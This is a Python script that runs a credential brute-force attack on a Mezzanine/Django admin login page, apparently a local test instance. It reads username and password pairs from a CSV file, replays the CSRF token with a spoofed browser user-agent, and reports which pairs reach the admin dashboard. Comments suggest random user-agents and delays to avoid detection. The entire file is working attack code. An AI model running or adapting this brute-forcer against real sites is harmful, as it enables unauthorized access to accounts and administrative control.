# -*- coding: utf-8 -*-

import csv
import os
from time import sleep

import requests

# NOTE: when you want to use Random-UserAgent, you should delete commentout some lines
#from fake_useragent import UserAgent


def acccess(http_info):
    request_info = http_info
    for key in ('payload', 'headers', 'querystring'):
        if key not in http_info:
            request_info[key] = {}

    try:
        res = requests.request(
            request_info['method'],
            request_info['url'],
            data=request_info['payload'],
            headers=request_info['headers'],
            params=request_info['querystring'],
        )
        return res
    except Exception as e:
        print(e)


def attacker(user, pass_):
    cookie = acccess({'method': 'GET', 'url': 'http://127.0.0.1:8000/admin'}).cookies['csrftoken']
    # NOTE: you should deley to access by using sleep function
    sleep(1)
    #ua = UserAgent(cache=False)
    res = acccess({
        'method': 'POST',
        'url': 'http://127.0.0.1:8000/ja/admin/login/',
        'querystring': {'next': '/ja/admin'},
        'payload': 'username={}&password={}&this_is_the_login_form=1&mezzanine_login_interface=admin&csrfmiddlewaretoken={}'.format(user, pass_, cookie),
        # NOTE: you can modify HTTP-Header
        'headers': {
            'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
            #'useragent': ua.random,
            'cookie': 'csrftoken={}'.format(cookie),
            'referer': 'http://127.0.0.1:8000/',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'http://127.0.0.1:8000',
            'cache-control': 'no-cache',
        },
    })
    if "ダッシュボード" in res.text:
        print("User: {}, Pass: {}, Result: Succeeded".format(user, pass_))
    else:
        print("User: {}, Pass: {}, Result: Failed".format(user, pass_))


def main():
    with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../attack_list.csv')))) as f:
        reader = csv.reader(f)
        header = next(reader)
        for row in reader:
            attacker(str(row[0]), str(row[1]))


if __name__ == '__main__':
    main()
